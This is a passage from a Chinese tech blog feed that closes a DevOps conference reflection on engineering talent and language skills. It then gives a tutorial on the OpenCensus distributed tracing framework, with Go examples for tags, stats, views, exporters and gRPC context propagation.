<p>特别是后两件事，我其实不太乐观：<strong>干好很难，干砸很容易</strong> 。<br>从业人才培养难题、在职人员的进修困境，早已有之，连BAT这样的巨头都时常流露出人才难求的尴尬境地。很多有识之士都曾经大声疾呼，但是商业和社区的冲突，能力和学历的争论，再加上当局和教育市场的避重就轻，这方面一直也没走出什么新路。归根到底，这需要产业结构、人才评价体制的根本提升。</p>
<p>不管怎么样，有些事总是需要有人去摸索吧，祝福。</p>
<p>关于工程师人才的微观定义，腾讯提了个自己的标准，供参考：<br>业务和架构能力<br>问题诊断能力<br>开源组件的改造能力<br>工具开发能力<br>运营平台构建能力<br>数据分析和决策能力<br>……</p>
<p>但是，个人觉得他们这个标准过于功利，还少那么一丢丢。</p>
<p>比如说，第一天Chris Jones演讲的时候，我内心深处是非常郁闷的。<br>当时Jones说一句，孙宇聪在一旁翻译一句。这场面像极了总理新闻发布会，演讲人和翻译一句一顿，看着都蛋疼。说实话，很难有多少交流传播价值。可是，话说回来了，你要不翻译，至少80%以上的人还真就听不明白，公开活动毕竟要照顾大多数。托教育部的福，现在全国人民的学历线可谓蒸蒸日上，跟通货一样膨胀。但是从业人员的语言水平，能达到并保持一定水准的，还真没几个。</p>
<p>反省自己，阅读资料的时候，不也经常放着官方文档不读，非要去找些东拼西凑的二手货吗？过去买的参考书，原著比例是多少？也算写过几片技术文章吧，被Google索引的有多少？ 能有多少东西是可以和国际同行交流的？</p>
<p><strong>跨语言能力绝对是弯道超车的必备利器！</strong></p>
<ul>
<li><a href="https://riboseyim.github.io/2017/06/27/Technology-English/">工程师的自我修养：全英文技术学习实践</a>。<br>严肃地讨论一下技术人员的语言能力问题，希望您读完以后能够有所触动、有所行动、有所裨益。</li>
</ul>
<h4 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h4><ol>
<li><a href="[http://mp.weixin.qq.com/s?\_\_biz=MzA4Nzg5Nzc5OA==&amp;mid=2651662368&amp;idx=1&amp;sn=766cd0f708e9d3a1449f1aac926e27e1&amp;scene=1&amp;srcid=0925yHh4bGlTvdUZ7og6Uulq#rd]">官方实录和PPT下载</a></li>
<li><a href="http://gops2016-shanghai-tcwechatshare.eventdove.com/">2016上海站日程表</a></li>
</ol>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="DevOps-漫谈系列"><a href="#DevOps-漫谈系列" class="headerlink" title="DevOps 漫谈系列"></a><a href="https://riboseyim.github.io/2016/07/28/DevOps/">DevOps 漫谈系列</a></h4><ul>
<li><a href="https://riboseyim.github.io/2018/04/10/DevOps-Phoenix/">《凤凰项目》：从作坊到工厂的寓言故事</a></li>
<li><a href="https://riboseyim.github.io/2017/08/06/TeamWork-Kanban/">Kanban 看板管理实践</a></li>
<li><a href="https://riboseyim.github.io/2018/03/26/DevOps-Deployment/">DevOps 漫谈：基础设施部署和配置管理</a></li>
<li><a href="https://riboseyim.github.io/2017/11/12/DevOps-Container-Security/">Linux 容器安全的十重境界</a></li>
<li><a href="https://riboseyim.github.io/2017/06/27/Technology-English/">工程师的自我修养：全英文技术学习实践</a></li>
</ul>
<h4 id="DevOps-实践的本质是文化"><a href="#DevOps-实践的本质是文化" class="headerlink" title="DevOps 实践的本质是文化"></a><a href="https://riboseyim.github.io/2018/03/29/DevOps-Culture/">DevOps 实践的本质是文化</a></h4><ul>
<li>学习力－团队生命之根</li>
<li>带领团队翻译书籍</li>
<li>Don’t make me think</li>
<li>凡是被很多人不断重复的好习惯，要将其自动化整合到工具</li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>架构师</tag>
      </tags>
  </entry>
  <entry>
    <title>DevOps 漫谈：开源分布式跟踪系统 OpenCensus</title>
    <url>/2018/04/27/DevOps-OpenCensus/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>Distributed Tracing and Monitoring System</li>
<li>OpenCensus: A framework for distributed tracing</li>
<li>OpenCensus Principle: data structure 、Context</li>
</ul>
<span id="more"></span>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DTM-OpenCensus-Theme.png" alt=""></p>
<p>This article is part of an <strong>Distributed Tracing and Monitoring System</strong> tutorial series. Make sure to check out my other articles as well:</p>
<ul>
<li><a href="https://riboseyim.github.io/2018/04/27/DevOps-OpenCensus">DevOps 漫谈：开源分布式跟踪系统 OpenCensus</a></li>
<li><a href="https://riboseyim.github.io/2018/05/18/DevOps-OpenTracing/">DevOps 漫谈：分布式追踪系统标准体系</a></li>
</ul>
<h2 id="绪论"><a href="#绪论" class="headerlink" title="绪论"></a>绪论</h2><p>随着互联网技术的高速发展，以往单应用的服务架构已经很难处理如山洪般增长的信息数据，随着云计算技术的大规模应用，以微服务、RESTful 为代表的各种软件架构广泛应用，跨团队、跨编程语言的大规模分布式系统也越来越多。相对而言，现在要理解系统行为，追踪诊断性能问题会复杂得多。</p>
<p>在单应用环境下，业务都在同一个服务器上，如果出现错误和异常只需要盯住一个点，就可以快速定位和处理问题；但是在微服务的架构下，功能模块天然是分布式部署运行的，前后台的业务流会经过很多个微服务的处理和传递，就连日志监控都会成为一个大问题（日志分散在多个服务器、无状态服务下如何查看业务流的处理顺序等），更不要说服务之间还有复杂的交互关系。</p>
<p>用户的一个请求在系统中会经过多个子系统（或者多个微服务）的处理，而且是发生在不同机器甚至是不同集群，当发生异常时需要快速发现问题，并准确定位到是哪个环节出了问题。对系统行为进行跟踪必须持续进行，因为异常的发生是无法预料的，有些甚至难以重现。跟踪需要无所不在，否则可能会遗漏某些重要的故障点。</p>
<p>为了解决上述问题，分布式跟踪系统 —— 一种帮助理解分布式系统行为、帮助分析性能问题的工具应运而生。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DTM-OpenCensus-Micro-1.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DTM-OpenCensus-Micro-2.png" alt=""></p>
<h2 id="第一部分-Google-Dapper-Distributed-Tracing-and-Monitoring-System"><a href="#第一部分-Google-Dapper-Distributed-Tracing-and-Monitoring-System" class="headerlink" title="第一部分 Google Dapper : Distributed Tracing and Monitoring System"></a>第一部分 Google Dapper : Distributed Tracing and Monitoring System</h2><blockquote>
<p>Modern Internet services are often implemented as complex, large-scale distributed systems.These applications are constructed from collections of software modules that may be developed by different teams, perhaps in different programming languages, and could span many thousands of machines across multiple physical facilities. Tools that aid in understanding system behavior and reasoning about performance issues are invaluable in such an environment.</p>
</blockquote>
<p>在分布式追踪领域著名的论文<a href="https://static.googleusercontent.com/media/research.google.com/zh-CN//archive/papers/dapper-2010-1.pdf">《Dapper, a Large-Scale Distributed Systems Tracing Infrastructure|Google Technical Report dapper-2010-1, April 2010》</a> Google 工程师提出了关于分布式跟踪系统的一些重要概念：</p>
<ul>
<li><p>Annotation-based，基于标注或植入点(埋点)<br>在应用程序或中间件中明确定义全局标注（Annotation），一个特殊的ID，通过这个 ID 连接每一条请求记录。当然，这需要代码植入，在生产环境中可以通过一个通用组件开放给开发人员。</p>
</li>
<li><p>跟踪树（trace tree）和 span<br>在 Dapper 跟踪树中，基本单元是树节点（分配 spanid）。节点之间通过连线表示父子关系，通过 parentId 和 spanId 把所有的关系串联起来，实现记录业务流的作用。</p>
</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DTM-Dapper-TraceTree-Span.png" alt=""></p>
<h2 id="第二部分-OpenCensus-A-framework-for-distributed-tracing"><a href="#第二部分-OpenCensus-A-framework-for-distributed-tracing" class="headerlink" title="第二部分 OpenCensus: A framework for distributed tracing"></a>第二部分 OpenCensus: A framework for distributed tracing</h2><blockquote>
<p>OpenCensus is a framework for stats collection and distributed tracing.</p>
</blockquote>
<p>Google Dapper 的定位更准确的说是分析系统，并不能解决从生产服务中提取数据的难题，OpenCensus 项目为此提供了解决方案。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DTM-OpenCensus-Logo.png" alt=""></p>
<p>OpenCensus 项目是 Google 开源的一个用来收集和追踪应用指标的第三方库。OpenCensus 能够提供了一套统一的测量工具：跨服务捕获跟踪跨度（span）、应用级别指标以及来自其他应用的元数据（例如日志）。OpenCensus 有如下一些主要特点：</p>
<ul>
<li>标准通信协议和一致的 API ：用于处理 metric 和 trace</li>
<li>多语言库，包括Java，C++，Go，.Net，<a href="https://github.com/census-instrumentation/opencensus-python">Python</a>，PHP，Node.js，Erlang 和 Ruby</li>
<li>与 RPC 框架的集成，可以提供开箱即用的追踪和指标。</li>
<li>集成的存储和分析工具</li>
<li>完全开源，支持第三方集成和输出的插件化</li>
<li>不需要额外的服务器或守护进程来支持 OpenCensus</li>
<li>In process debugging：一个可选的代理程序，用于在目标主机上显示请求和指标数据</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DTM-OpenCensus-Language.png" alt=""></p>
<h2 id="OpenCensus-Concepts"><a href="#OpenCensus-Concepts" class="headerlink" title="OpenCensus Concepts"></a>OpenCensus Concepts</h2><h4 id="Tags-标签"><a href="#Tags-标签" class="headerlink" title="Tags | 标签"></a>Tags | 标签</h4><p>OpenCensus 允许系统在记录时将度量与维度相关联。记录的数据使我们能够从各种不同的角度分析测量结果，即使在高度互连和复杂的系统中也能够应付。<br>标签以键值对的形式在上下文中传递，并且允许在当前上下文中添加或修改。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">ctx, err = tag.New(ctx,</span><br><span class="line">	tag.Insert(osKey, <span class="string">&quot;macOS-10.12.5&quot;</span>),</span><br><span class="line">	tag.Upsert(userIDKey, <span class="string">&quot;cde36753ed&quot;</span>),</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<h4 id="Stats-统计"><a href="#Stats-统计" class="headerlink" title="Stats | 统计"></a>Stats | 统计</h4><p>Stats 收集库和应用程序记录的测量结果，汇总、导出统计数据。为了实现低开销（ a low-overhead framework even if instrumentation is always enabled ），数据点记录和数据聚合是分离的，OpenCensus 统计收集分两个阶段进行：</p>
<ul>
<li>测量的定义和数据点的记录 | Definition of measures and recording of data points</li>
<li>视图的定义和记录数据的聚合 | Definition of views and aggregation of the recorded data</li>
</ul>
<h4 id="Recording-记录"><a href="#Recording-记录" class="headerlink" title="Recording | 记录"></a>Recording | 记录</h4><p>量度 (Measurements) 是与测量相关联的数据点。(Measurements are data points associated with a measure.)<br>记录 (Recording) 利用上下文中所提供的标签隐式地标记量度集合。(Recording implicitly tags the set of Measurements with the tags from the provided context.)</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">stats.Record(ctx, videoSize.M(<span class="number">102478</span>))</span><br></pre></td></tr></table></figure>
<h4 id="Trace-跟踪"><a href="#Trace-跟踪" class="headerlink" title="Trace | 跟踪"></a>Trace | 跟踪</h4><p>Trace 是嵌套 Span (跨度)的集合。Trace 包括单个用户请求的处理进度，直到用户请求得到响应。Trace 通常跨越分布式系统中的多个节点。跟踪由 TraceId 唯一标识， Trace 中的所有 Span 都具有相同的 TraceId 。</p>
<p>一个 Span 代表一个操作或一个工作单位。多个 Span 可以是“Trace”的一部分，它代表跨多个进程/节点的执行路径（通常是分布式的）。同一轨迹内的 Span 具有相同的 TraceId。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">ctx, span := trace.StartSpan(ctx, <span class="string">&quot;your function name&quot;</span>)</span><br><span class="line"><span class="keyword">defer</span> span.End()</span><br></pre></td></tr></table></figure>
<h4 id="视图-Views"><a href="#视图-Views" class="headerlink" title="视图 | Views"></a>视图 | Views</h4><p>视图用于聚合测量结果。你可以把它们看作是对记录数据点（量度）集合的查询。<br>视图包括两个部分：分组标签（group by）和聚合类型（aggregation type）。<br>目前 OpenCensus  ( Golang API ) 支持三种类型的聚合：</p>
<ul>
<li>CountAggregation 用于记录被抽样的次数；</li>
<li>DistributionAggregation 用于提供包含一系列样本值的直方图；</li>
<li>SumAggregation 用于汇总所有样本值。</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">distAgg := view.Distribution(<span class="number">0</span>, <span class="number">1</span>&lt;&lt;<span class="number">32</span>, <span class="number">2</span>&lt;&lt;<span class="number">32</span>, <span class="number">3</span>&lt;&lt;<span class="number">32</span>)</span><br><span class="line">countAgg := view.Count()</span><br><span class="line">sumAgg := view.Sum()</span><br></pre></td></tr></table></figure>
<p>示例：创建一个视图（ DistributionAggregation，指标 “videoSize” ）<br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> err := view.Register(&amp;view.View&#123;</span><br><span class="line">	Name:        <span class="string">&quot;my.org/video_size_distribution&quot;</span>,</span><br><span class="line">	Description: <span class="string">&quot;distribution of processed video size over time&quot;</span>,</span><br><span class="line">	Measure:     videoSize,</span><br><span class="line">	Aggregation: view.Distribution(<span class="number">0</span>, <span class="number">1</span>&lt;&lt;<span class="number">32</span>, <span class="number">2</span>&lt;&lt;<span class="number">32</span>, <span class="number">3</span>&lt;&lt;<span class="number">32</span>),</span><br><span class="line">&#125;); err != <span class="literal">nil</span> &#123;</span><br><span class="line">	log.Fatalf(<span class="string">&quot;Failed to subscribe to view: %v&quot;</span>, err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="Introspection-内省"><a href="#Introspection-内省" class="headerlink" title="Introspection | 内省"></a>Introspection | 内省</h4><p>OpenCensus 提供在线仪表板，显示进程中的诊断数据。这些页面被称为 z-pages ，它们有助于了解如何查看来自特定进程的数据，而不必依赖任何度量收集器或分布式跟踪后端。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DTM-OpenCensus-traceZ.png" alt=""></p>
<h2 id="OpenCensus-Examples"><a href="#OpenCensus-Examples" class="headerlink" title="OpenCensus Examples"></a>OpenCensus Examples</h2><h4 id="创建指标"><a href="#创建指标" class="headerlink" title="创建指标"></a>创建指标</h4><ul>
<li>定义指标类型</li>
<li>定义显示方式</li>
</ul>
<p>Track Metrics 一般需要考虑服务负载（Server Load）、响应时间（Response Time）、误码率(Error Rates)等。</p>
<p>实例：</p>
<ul>
<li><a href="https://github.com/census-instrumentation/opencensus-go/blob/master/examples/http/helloworld_server/main.go">opencensus-go-examples-helloworld</a></li>
<li><a href="https://github.com/census-instrumentation/opencensus-java">opencensus-java-examples</a></li>
<li><a href="https://medium.com/@orijtech/hello-world-for-web-servers-in-go-with-opencensus-29955b3f02c6">“Hello, world!” for web servers in Go with OpenCensus</a></li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">  <span class="string">&quot;go.opencensus.io/stats&quot;</span></span><br><span class="line">  <span class="string">&quot;go.opencensus.io/tag&quot;</span></span><br><span class="line">  <span class="string">&quot;go.opencensus.io/stats/view&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">  requestCounter             *stats.Float64Measure</span><br><span class="line">  codeKey                    tag.Key</span><br><span class="line">  DefaultLatencyDistribution = view.DistributionAggregation&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">25</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>, <span class="number">65</span>, <span class="number">80</span>, <span class="number">100</span>, <span class="number">130</span>, <span class="number">160</span>, <span class="number">200</span>, <span class="number">250</span>, <span class="number">300</span>, <span class="number">400</span>, <span class="number">500</span>, <span class="number">650</span>, <span class="number">800</span>, <span class="number">1000</span>, <span class="number">2000</span>, <span class="number">5000</span>, <span class="number">10000</span>, <span class="number">20000</span>, <span class="number">50000</span>, <span class="number">100000</span>&#125;</span><br><span class="line">)</span><br><span class="line">	codeKey, _ = tag.NewKey(<span class="string">&quot;banias/keys/code&quot;</span>)</span><br><span class="line"></span><br><span class="line">  requestCounter, _ = stats.Float64(<span class="string">&quot;banias/measures/request_count&quot;</span>, <span class="string">&quot;Count of HTTP requests processed&quot;</span>, stats.UnitNone)</span><br><span class="line">	view.Subscribe(</span><br><span class="line">		&amp;view.View&#123;</span><br><span class="line">			Name:        <span class="string">&quot;request_count&quot;</span>,</span><br><span class="line">			Description: <span class="string">&quot;Count of HTTP requests processed&quot;</span>,</span><br><span class="line">			TagKeys:     []tag.Key&#123;codeKey&#125;,</span><br><span class="line">			Measure:     requestCounter,</span><br><span class="line">			Aggregation: view.CountAggregation&#123;&#125;,</span><br><span class="line">		&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// requestlatency .....</span></span><br><span class="line"></span><br><span class="line">	view.SetReportingPeriod(<span class="number">1</span> * time.Second)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="收集指标数据"><a href="#收集指标数据" class="headerlink" title="收集指标数据"></a>收集指标数据</h4><ul>
<li>Call the Record method</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Go Code Example</span></span><br><span class="line"><span class="comment">// 说明：defer 用于资源的释放，会在函数返回之前进行调用。</span></span><br><span class="line"><span class="comment">// 如果有多个 defer表达式，调用顺序类似于栈，越后面的 defer 表达式越先被调用。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Collector)</span> <span class="title">Collect</span><span class="params">(ctx *fasthttp.RequestCtx)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">(begin time.Time)</span></span> &#123;</span><br><span class="line">      responseTime := <span class="keyword">float64</span>(time.Since(begin).Nanoseconds() / <span class="number">1000</span>)</span><br><span class="line">      occtx, _ := tag.New(context.Background(), tag.Insert(codeKey, strconv.Itoa(ctx.Response.StatusCode())), )</span><br><span class="line"></span><br><span class="line">      stats.Record(occtx, requestCounter.M(<span class="number">1</span>))</span><br><span class="line">      stats.Record(occtx, requestlatency.M(responseTime))</span><br><span class="line"></span><br><span class="line">    &#125;(time.Now())</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*do some stuff */</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="第三方数据接口-Exporter"><a href="#第三方数据接口-Exporter" class="headerlink" title="第三方数据接口 | Exporter"></a>第三方数据接口 | Exporter</h4><p>OpenCensus 是独立于供应商的。OpenCensus 收集和跟踪的应用指标可以在本地显示，也可将其发送到第三方分析工具或监控系统实现可视化，例如：</p>
<ul>
<li><a href="https://prometheus.io">Prometheus|普罗米修斯</a></li>
<li><a href="https://cloud.google.com/stackdriver/">Stackdriver|适用于 Google Cloud Platform 与 AWS 应用的监控、日志记录和诊断工具</a> | <a href="https://medium.com/@orijtech/cloud-spanner-instrumented-by-opencensus-and-exported-to-stackdriver-6ed61ed6ab4e">示例</a></li>
<li><a href="https://zipkin.io">Zipkin</a></li>
<li><a href="https://medium.com/@DazWilkin/opencensus-tracing-w-jaeger-2ada1656a2bf">OpenCensus Tracing with Uber’s Jaeger project</a></li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">import</span> (</span><br><span class="line"> 	 <span class="string">&quot;go.opencensus.io/exporter/prometheus&quot;</span></span><br><span class="line">   <span class="string">&quot;go.opencensus.io/exporter/stackdriver&quot;</span></span><br><span class="line">    openzipkin <span class="string">&quot;github.com/openzipkin/zipkin-go&quot;</span></span><br><span class="line">  	 <span class="string">&quot;go.opencensus.io/exporter/zipkin&quot;</span></span><br><span class="line">    xray <span class="string">&quot;github.com/census-instrumentation/opencensus-go-exporter-aws&quot;</span></span><br><span class="line">  	 <span class="string">&quot;go.opencensus.io/trace&quot;</span></span><br><span class="line">   <span class="string">&quot;go.opencensus.io/stats/view&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Opention: Export to Prometheus Monitoring.</span></span><br><span class="line"> Exporter, err := prometheus.NewExporter(prometheus.Options&#123;&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">	logger.Error(<span class="string">&quot;Error creating prometheus exporter  &quot;</span>, zap.Error(err))</span><br><span class="line">&#125;</span><br><span class="line">view.RegisterExporter(pExporter)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="comment">// Opention: Export to Stackdriver Monitoring.</span></span><br><span class="line">sExporter, err := stackdriver.NewExporter(stackdriver.Options&#123;ProjectID: config.ProjectID&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">	logger.Error(<span class="string">&quot;Error creating stackdriver exporter  &quot;</span>, zap.Error(err))</span><br><span class="line">&#125;</span><br><span class="line">view.RegisterExporter(sExporter)</span><br><span class="line"></span><br><span class="line"> <span class="comment">// Opention: Export to Zipkin Monitoring.</span></span><br><span class="line">localEndpoint, err := openzipkin.NewEndpoint(<span class="string">&quot;service-A&quot;</span>, <span class="string">&quot;127.0.1.1:8080&quot;</span>)</span><br><span class="line">reporter := http.NewReporter(<span class="string">&quot;http://127.0.1.110:9411/api/v2/spans&quot;</span>)</span><br><span class="line"><span class="keyword">defer</span> reporter.Close()</span><br><span class="line">exporter := zipkin.NewExporter(reporter, localEndpoint)</span><br><span class="line">trace.RegisterExporter(exporter)</span><br><span class="line"></span><br><span class="line"> <span class="comment">// Opention: Export to AWS X-Ray</span></span><br><span class="line">xe, err := xray.NewExporter(xray.WithVersion(<span class="string">&quot;latest&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">	log.Fatalf(<span class="string">&quot;Failed to create AWS X-Ray exporter: %v&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">trace.RegisterExporter(xe)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="数据可视化"><a href="#数据可视化" class="headerlink" title="数据可视化"></a>数据可视化</h4><ul>
<li>函数内容为空（微秒级）</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/zipkin-%E7%A9%BA%E6%96%B9%E6%B3%95.png" alt=""></p>
<ul>
<li>串行调用函数方法，内容包括网络访问和持久化操作（毫秒级）</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/zipkin-%E4%B8%B2%E8%A1%8C.png" alt=""></p>
<ul>
<li>并行调用函数方法（Go routine），内容与上同</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/zipkin-%E5%B9%B6%E8%A1%8C.png" alt=""></p>
<ul>
<li>串行/并行混合调用</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">go</span> go_ping(ctx, <span class="string">&quot;192.168.213.128&quot;</span>, <span class="number">2</span>, time.Second*<span class="number">3</span>, <span class="literal">false</span>)</span><br><span class="line"><span class="keyword">go</span> go_ping(ctx, <span class="string">&quot;192.168.213.128&quot;</span>, <span class="number">2</span>, time.Second*<span class="number">3</span>, <span class="literal">false</span>)</span><br><span class="line"><span class="keyword">go</span> go_ping(ctx, <span class="string">&quot;192.168.213.129&quot;</span>, <span class="number">2</span>, time.Second*<span class="number">5</span>, <span class="literal">false</span>)</span><br><span class="line">go_ping(ctx, <span class="string">&quot;192.168.213.128&quot;</span>, <span class="number">2</span>, time.Second*<span class="number">3</span>, <span class="literal">false</span>)</span><br><span class="line">go_ping(ctx, <span class="string">&quot;192.168.213.128&quot;</span>, <span class="number">2</span>, time.Second*<span class="number">3</span>, <span class="literal">false</span>)</span><br><span class="line">go_ping(ctx, <span class="string">&quot;192.168.213.128&quot;</span>, <span class="number">2</span>, time.Second*<span class="number">3</span>, <span class="literal">false</span>)</span><br></pre></td></tr></table></figure>
<p><img src="http://riboseyim-qiniu.riboseyim.com/zipkin-%E6%B7%B7%E5%90%88.png" alt=""></p>
<ul>
<li>多服务调用</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DTM-Zipkin-Twitter.png" alt="OpenZipkin-Twitter"></p>
<h2 id="第三部分：OpenCensus-Principle-工作原理-待续"><a href="#第三部分：OpenCensus-Principle-工作原理-待续" class="headerlink" title="第三部分：OpenCensus Principle | 工作原理 (待续)"></a>第三部分：OpenCensus Principle | 工作原理 (待续)</h2><h4 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h4><p>Span 共有属性：</p>
<ul>
<li>TraceId</li>
<li>SpanId</li>
<li>Start Time</li>
<li>End Time</li>
<li>Status</li>
</ul>
<p>Span 可选属性：</p>
<ul>
<li>Parent SpanId</li>
<li>Remote Parent</li>
<li>Attributes</li>
<li>Annotations</li>
<li>Message Events</li>
<li>Links</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//go.opencensus.io/trace.go</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Span <span class="keyword">struct</span> &#123;</span><br><span class="line">	<span class="comment">// data contains information recorded about the span.</span></span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	<span class="comment">// It will be non-nil if we are exporting the span or recording events for it.</span></span><br><span class="line">	<span class="comment">// Otherwise, data is nil, and the Span is simply a carrier for the</span></span><br><span class="line">	<span class="comment">// SpanContext, so that the trace ID is propagated.</span></span><br><span class="line">	data        *SpanData</span><br><span class="line">   <span class="comment">// protects the contents of *data (but not the pointer value.)</span></span><br><span class="line">	mu          sync.Mutex</span><br><span class="line">	spanContext SpanContext</span><br><span class="line">	<span class="comment">// spanStore is the spanStore this span belongs to, if any, otherwise it is nil.</span></span><br><span class="line">	*spanStore</span><br><span class="line"></span><br><span class="line">	endOnce sync.Once</span><br><span class="line"></span><br><span class="line">	executionTracerTaskEnd <span class="function"><span class="keyword">func</span><span class="params">()</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> SpanContext <span class="keyword">struct</span> &#123;</span><br><span class="line">	TraceID      TraceID</span><br><span class="line">	SpanID       SpanID</span><br><span class="line">	TraceOptions TraceOptions</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="http://riboseyim-qiniu.riboseyim.com/OpenCensus-DataModel-Base.png" alt=""></p>
<h4 id="上下文-Context"><a href="#上下文-Context" class="headerlink" title="上下文 Context"></a>上下文 Context</h4><p><img src="http://riboseyim-qiniu.riboseyim.com/DTM-Context.png" alt=""></p>
<p>上下文 Context 按照树型关系构建。以 Golang 为例，创建 Context 树第一步就是通过 context.Background() 得到根节点，再由 WithCancel()、WithTimeout() 等函数创建其它的子节点，孙节点。子节点从父节点复制得到，在子节点也可以设定新的状态值，如此就可以使元数据在子节点之间层层传递。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Background</span><span class="params">()</span> <span class="title">Context</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WithCancel</span><span class="params">(parent Context)</span> <span class="params">(ctx Context, cancel CancelFunc)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WithDeadline</span><span class="params">(parent Context, deadline time.Time)</span> <span class="params">(Context, CancelFunc)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WithTimeout</span><span class="params">(parent Context, timeout time.Duration)</span> <span class="params">(Context, CancelFunc)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WithValue</span><span class="params">(parent Context, key <span class="keyword">interface</span>&#123;&#125;, val <span class="keyword">interface</span>&#123;&#125;)</span> <span class="title">Context</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>gRPC Client</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">conn, err := grpc.Dial(address, grpc.WithStatsHandler(&amp;ocgrpc.ClientHandler&#123;&#125;), grpc.WithInsecure())</span><br><span class="line"><span class="keyword">defer</span> conn.Close()</span><br><span class="line"></span><br><span class="line">c := pb.NewGreeterClient(conn)</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">  r, err := c.SayHello(context.Background(), &amp;pb.HelloRequest&#123;Name: name&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>gRPC Server</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SayHello implements helloworld.GreeterServer</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *server)</span> <span class="title">SayHello</span><span class="params">(ctx context.Context, in *pb.HelloRequest)</span> <span class="params">(*pb.HelloReply, error)</span></span> &#123;</span><br><span class="line">	ctx, span := trace.StartSpan(ctx, <span class="string">&quot;sleep&quot;</span>)</span><br><span class="line">	time.Sleep(time.Duration(rand.Float64() * <span class="keyword">float64</span>(time.Second)))</span><br><span class="line">	span.End()</span><br><span class="line">	<span class="keyword">return</span> &amp;pb.HelloReply&#123;Message: <span class="string">&quot;Hello &quot;</span> + in.Name&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>go.opencensus.io/trace.go</strong> 源码</li>
</ul>
